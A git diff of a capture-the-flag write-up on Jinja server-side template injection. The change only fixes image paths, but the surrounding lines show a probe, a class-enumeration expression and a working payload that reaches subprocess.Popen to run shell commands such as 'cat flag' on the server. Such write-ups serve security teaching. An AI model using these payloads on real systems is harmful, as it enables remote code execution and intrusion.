@@ -16,15 +16,15 @@ The name of the challenge pointed towards using template injection to find the f
 Inputting `{{7*7}}` resulted in the expression 7*7 to evaluate as 49 as shown in the 
 resulting announcement indicating jinja was being used.
 
-![alt text](<images/Screenshot 2025-12-23 at 8.59.29 PM.png>)
-![alt text](<images/Screenshot 2025-12-23 at 9.00.34 PM.png>)
+![alt text](<../images/Screenshot 2025-12-23 at 8.59.29 PM.png>)
+![alt text](<../images/Screenshot 2025-12-23 at 9.00.34 PM.png>)
 
 I used the following expression, getting all classes in the python enviornment 
 by first reaching the object class through the inheritance tree of the string class. 
 
 `{{ ''.__class__.__mro__[1].__subclasses__() }}`
 
-![alt text](<images/Screenshot 2025-12-23 at 9.02.13 PM.png>)
+![alt text](<../images/Screenshot 2025-12-23 at 9.02.13 PM.png>)
 
 I discovered the location of subprocess.Popen which would allow me to execute shell commands on the server from the client. 
 I used ls to list files/folders in the current directory and used communicate()[0] to get the standard output.
@@ -39,4 +39,4 @@ I used cat to read the flag file which resulted in the announcement displaying t
 
 `{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0] }} `
 
-![alt text](<images/Screenshot 2025-12-23 at 9.03.35 PM.png>)
+![alt text](<../images/Screenshot 2025-12-23 at 9.03.35 PM.png>)
